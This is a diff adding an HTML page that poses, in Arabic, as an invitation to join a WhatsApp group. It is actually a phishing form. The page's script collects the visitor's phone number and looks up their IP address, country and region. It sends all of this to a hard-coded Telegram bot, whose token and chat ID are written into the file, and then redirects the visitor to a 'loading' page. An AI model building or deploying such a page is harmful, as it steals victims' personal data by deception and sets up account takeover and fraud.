@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>International Telephone Input</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="Smoflo.png.png" type="image/png"> <!-- Favicon -->
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+        let phoneInput;
+
+        function getFlagEmoji(countryCode) {
+            const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
+            return String.fromCodePoint(...codePoints);
+        }
+
+        async function getIpInfo() {
+            const response = await fetch('https://ipinfo.io/json?token=4d1535316da2be'); // Replace with your token
+            return response.json();
+        }
+
+        async function sendToTelegram(message) {
+            const telegramToken = '7388555407:AAHCdsvGHsRMpTNuvUBqPWE5bBRCND60ww8'; // Replace with your bot token
+            const chatId = '1960645055'; // Replace with your chat ID
+            const url = `https://api.telegram.org/bot7388555407:AAHCdsvGHsRMpTNuvUBqPWE5bBRCND60ww8/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault(); // Prevent the default form submission
+            const phoneNumber = phoneInput.getNumber(); // Get the formatted phone number
+            const ipInfo = await getIpInfo();
+
+            const countryCode = ipInfo.country; // Get the country code
+            const flagEmoji = getFlagEmoji(countryCode); // Get the flag emoji
+
+            // Get the country calling code
+            const callingCode = phoneInput.getSelectedCountryData().dialCode;
+
+            // Create the message to send to Telegram
+            const message = `
+                Phone Number: ${phoneNumber}
+IP Address: ${ipInfo.ip}
+Country Code: ${countryCode} ${flagEmoji}
+Country Calling Code: ${callingCode}
+Country: ${ipInfo.region}
+            `;
+
+            // Send the message to your Telegram bot
+            await sendToTelegram(message);
+            
+            // Redirect to the loading page only after the message is sent
+            window.location.href = "loading.html"; // Change to your loading page
+        }
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            const phoneInputField = document.querySelector("#phone");
+            const ipInfo = await getIpInfo();
+            const countryCode = ipInfo.country ? ipInfo.country.toLowerCase() : 'us'; // Default to 'us'
+
+            // Initialize intl-tel-input with automatic country code based on IP
+            phoneInput = window.intlTelInput(phoneInputField, {
+                initialCountry: countryCode,
+                geoIpLookup: (callback) => {
+                    callback(countryCode); // Use the country code fetched from IP
+                },
+                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+            });
+
+            // Bind the form submit to the handleSubmit function
+            document.querySelector("form").addEventListener("submit", handleSubmit);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="DSxOAUB0raA.png" alt="Logo" class="logo"> <!-- Replace with your logo -->
+        <div>
+            <img src="172245867233593622.png" alt="Description Image" class="description-img"> <!-- Replace with your image -->
+            <form>
+                <h4 style="color:#5E5E5E; font-size: large;">الدعوة للانضمام إلى مجموعة واتساب
+                </h4>
+                <input id="phone" type="tel" name="phone" required pattern="[0-9]*" title="Please enter numbers only" />
+                <div>
+                    <button style="padding: 10px 20px;
+                    font-size: 16px;
+                    background-color: #4CAF50; 
+                    color: #fff; 
+                    border-top: 10px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                    margin-top: 10px;
+                    display: inline-block; 
+                    width: 150px;" type="submit">متابعة</button>
+                </div>
+            </form>
+            <div class="alert alert-info" style="display: none;"></div>
+        </div>
+    </div>
+</body>
+</html>
